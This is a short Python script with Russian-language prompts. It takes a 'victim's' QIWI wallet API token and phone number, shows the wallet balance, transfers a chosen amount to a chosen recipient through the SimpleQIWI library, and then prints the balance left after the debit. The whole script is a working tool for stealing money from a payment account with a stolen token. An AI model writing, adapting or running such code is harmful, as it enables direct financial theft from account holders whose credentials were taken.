from SimpleQIWI import *

token = input("Введите токен жертвы : ") 
phone = input("Введите телефон жертвы (с +) : ")
api = QApi(token=token, phone=phone)

print(api.balance)
a = input(" Введите номер получателя : ")
b = input(" Введите сумму перевода : ")
c = input(" Укажите комментарий к переводу : ")

api.pay(account=a, amount=b, comment=c)

print(' Баланс после списания')
print(api.balance)